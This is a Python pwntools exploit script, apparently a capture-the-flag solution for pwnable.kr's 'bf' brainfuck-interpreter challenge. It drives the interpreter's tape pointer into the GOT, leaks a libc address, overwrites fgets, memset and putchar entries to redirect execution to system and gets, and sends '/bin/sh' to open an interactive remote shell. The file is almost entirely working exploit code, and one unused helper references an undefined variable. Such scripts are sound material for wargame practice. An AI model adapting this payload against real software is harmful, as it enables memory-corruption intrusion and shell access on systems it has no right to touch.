#!/usr/bin/env python2
from pwn import *
import re

incr_ptr='>'
decr_ptr='<'
get_char=','
put_char='.'



def incrPtr(payload, addr, addr_dst):
    while addr < addr_dst:
        payload += incr_ptr
        addr += 1
    
    return (addr, payload)

def decrPtr(payload, addr, addr_dst):
    while addr > addr_dst:
        payload += decr_ptr
        addr -= 1
    
    return (addr, payload)

def adjustPtr(payload, addr, addr_dst):
    print hex(addr), " -> ", hex(addr_dst), "  ", hex(addr-addr_dst)
    if addr_dst < addr:
        return decrPtr(payload, addr, addr_dst)
    return incrPtr(payload, addr, addr_dst)

def writeAddrDown(payload, addr):
    for c in range(4):
        payload += get_char
        payload += decr_ptr
        addr -= 1

    return (addr, payload)

def writeAddrUp(payload, addr):
    for c in range(4):
        payload1 += get_char
        payload1 += incr_ptr
        addr += 1

    return (addr, payload)


def writeAddrDownPayload(payload, addr):
    print "write addr ", hex(addr)," -> ", p32(addr)
    for c in p32(addr)[::-1]:
        payload += c

    return payload

def writeAddrUpPayload(payload, addr):
    for c in p32(addr):
        payload += c
        addr += 1

    return payload


def readAddr(payload, addr):
    for i in range(4):
        payload += put_char
        payload += decr_ptr
        addr -= 1
 
    return (addr, payload)

def sendPayload(sh, payload): 
    print(payload, len(payload))   
    print("sending payload ..." + str(len(payload)))
    sh.sendline(payload)

def readLine(sh, num):
    line = sh.recvuntil(b'\n', drop=False)
    print("receiving data...")

    l = []
    for i in range(num):
        line = ""
        for j in range(4):
            line += sh.read(1)
        print(bytes(line))
        u = make_unpacker(32, endian='little', sign='unsigned')
        addr = u(line[::-1])
        l += [addr]
        print(hex(addr))
    return l

get_shell_addr = 0x8048430
strange_code_ptr = 0x804a008 #offset to system
strange_code_arg = 0x804a004 #ptr to string

bf = ELF('bf')
libc = ELF('libc.so.6')

bin_sh_offset=next(libc.search("/bin/sh", writable = False))
start_main_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']
gets_offset = libc.symbols['gets']

print "bin_sh: ", hex(bin_sh_offset)
print "s_main: ", hex(start_main_offset)
print "system: ", hex(system_offset)
print "gets: ", hex(gets_offset)
print "putchar: ", hex(libc.symbols['putchar'])
print "getchar: ", hex(libc.symbols['getchar'])

ptr_start_addr = bf.symbols['tape'] 
putchar_addr = bf.got['putchar']
getchar_addr = bf.got['getchar']
memset_addr = bf.got['memset']
fgets_addr = bf.got['fgets']
libc_start_addr = bf.got['__libc_start_main']
stack_chk_fail_addr = bf.got['__stack_chk_fail']

print "ptr_start: ", hex(ptr_start_addr)
print "putchar  : ", hex(putchar_addr)
print "getchar  : ", hex(getchar_addr)
print "s_main   : ", hex(libc_start_addr)


if __name__ == '__main__':
    payload = ''
    payload2 =''
    addr = ptr_start_addr
   
    #get memset addr 
    addr, payload = adjustPtr(payload, addr, libc_start_addr + 3)
    addr, payload = readAddr(payload, addr)
    #stackfail->benign addr
    addr, payload = adjustPtr(payload, addr, stack_chk_fail_addr + 3)
    addr, payload = writeAddrDown(payload, addr)
    #fgets->system
    addr, payload = adjustPtr(payload, addr, fgets_addr + 3)
    addr, payload = writeAddrDown(payload, addr)
    #memset->fgets
    addr, payload = adjustPtr(payload, addr, memset_addr + 3)
    addr, payload = writeAddrDown(payload, addr)
    #putchar->main
    addr, payload = adjustPtr(payload, addr, putchar_addr + 3)
    addr, payload = writeAddrDown(payload, addr)
    
    #jump main
    payload += put_char 

    sh = remote('pwnable.kr', 9001)
    print(sh.recvuntil(']'))
    sendPayload(sh, payload)
    start_main_addr = readLine(sh,1)[0]

    ##payload2 = writeAddrDownPayload(payload2, 0x80486de)
    #payload2 = writeAddrDownPayload(payload2, get_shell_addr)
    #payload2 = writeAddrDownPayload(payload2, start_main_addr + printf_offset - start_main_offset)
    #payload2 = writeAddrDownPayload(payload2, start_main_addr + bin_sh_offset - start_main_offset)

    sh.send(p32(0x8048792)[::-1])
    sh.send(p32(start_main_addr + system_offset - start_main_offset)[::-1])
    sh.send(p32(start_main_addr + gets_offset - start_main_offset)[::-1])
    sh.send(p32(0x80486de)[::-1])
    sh.sendline('/bin/sh\x00')
    #
    sh.interactive()

#    print(line, len(line))
#    #print(u(line))
#    for i in range(len(line)/4):
#        label = addr -3
#        if label in addr_dict:
#            print addr_dict[label], ": ",
#        else:
#            print hex(label), ": ",
#        print(hex(u(line[4*i:4*i+4][::-1])))
#        addr-=4
#
